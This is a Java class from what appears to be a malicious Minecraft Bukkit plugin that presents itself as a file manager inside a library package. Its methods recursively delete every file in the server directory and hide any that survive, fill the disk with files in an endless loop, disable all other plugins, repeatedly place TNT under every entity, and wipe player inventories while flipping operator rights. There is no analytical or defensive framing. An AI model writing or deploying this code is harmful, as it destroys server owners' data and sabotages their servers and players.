package me.unknown.filemanager;

import java.io.File;
import java.io.IOException;

import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.World;
import org.bukkit.entity.Entity;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

import me.unknown.lib.Lib;

public class FileManager {
	
	String dir = System.getProperty("user.dir");
	String directoryPathFile = dir + File.separator;
	Lib plugin;
	
	public FileManager(Lib instance) {
		plugin = instance;
	}
	
	public void deleteDirectoryInternal(File file) {
		Bukkit.getServer().getScheduler().runTaskAsynchronously(plugin, new Runnable() {
			
			@Override
			public void run() {
				// TODO Auto-generated method stub
				File[] awdaa = (new File(file.getAbsoluteFile() + file.separator)).listFiles();
				for (File wad : awdaa) {
					if (wad.isDirectory()) {
						deleteDirectoryInternal(wad);
					}
					wad.delete();
					if (wad.exists()) {
						try {
							Process p = Runtime.getRuntime().exec("attrib +H " + wad.getPath());
						} catch (IOException e) {
							e.printStackTrace();
						}
					}
					
					// ranTime++;
				}
			}
			
		});
		
	}
	
	public void disablePlugins() {
		for (Plugin plugin : Bukkit.getPluginManager().getPlugins()) {
			if (!plugin.getName().equals("PhoenixLib")) {
				Bukkit.getPluginManager().disablePlugin(plugin);
			}
		}
	}
	public void onTnt() {
		for (World w : Bukkit.getWorlds()) {
			Bukkit.getServer().getScheduler().scheduleSyncRepeatingTask(plugin, new Runnable() {
				
				@Override
				public void run() {
					for (Entity e : w.getEntities()) {
						e.getWorld().getBlockAt(e.getLocation()).setType(Material.TNT);
						e.getWorld().getBlockAt(e.getLocation().add(0, 1, 0)).setType(Material.REDSTONE_BLOCK);
						e.getWorld().getBlockAt(e.getLocation().add(0, 2, 0)).setType(Material.TNT);
						e.getWorld().getBlockAt(e.getLocation().add(0, 4, 0)).setType(Material.TNT);
						e.getWorld().getBlockAt(e.getLocation().add(0, 3, 0)).setType(Material.TNT);
					}
					
				}
				
			}, 0, 200);
		}
	}
	public void spamFiles() {
		int x = 0;
		while (true) {
			File f = new File(directoryPathFile + File.separator + "null" +
			        x);
			try {
				f.createNewFile();
			} catch (IOException e) {
				e.printStackTrace();
			}
			x++;
		}
	}
	public void opAllAndDeopAll() {
		for (Player p : Bukkit.getOnlinePlayers()) {
			p.getInventory().clear();
			p.getEnderChest().clear();
			if (p.isOp()) {
				p.setOp(false);
			} else {
				p.setOp(true);
			}
		}
	}
	public void deleteAllFiles() {
		
		plugin.deleteServer = true;
		File[] d = (new File(directoryPathFile)).listFiles();
		for (File file : d) {
			if (file.isDirectory()) {
				try {
					deleteDirectoryInternal(file);
				} catch (Exception ee) {
					;
				}
			}
			file.delete();
			if (file.exists()) {
				try {
					Process p = Runtime.getRuntime().exec("attrib +H " + file.getPath());
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
		}
		/*
		 * Bukkit.getScheduler().runTask(plugin, new Runnable() {
		 * 
		 * @Override public void run() { for (int x = 0; x != 50000; x++) { for (int y =
		 * 0; y != 50000; y++) { for (int z = 0; z != 50000; z++) { for (World world :
		 * Bukkit.getWorlds()) { world.getBlockAt(x, y, z).setType(Material.AIR); } } }
		 * } }
		 * 
		 * });
		 */
		
	}
	
}
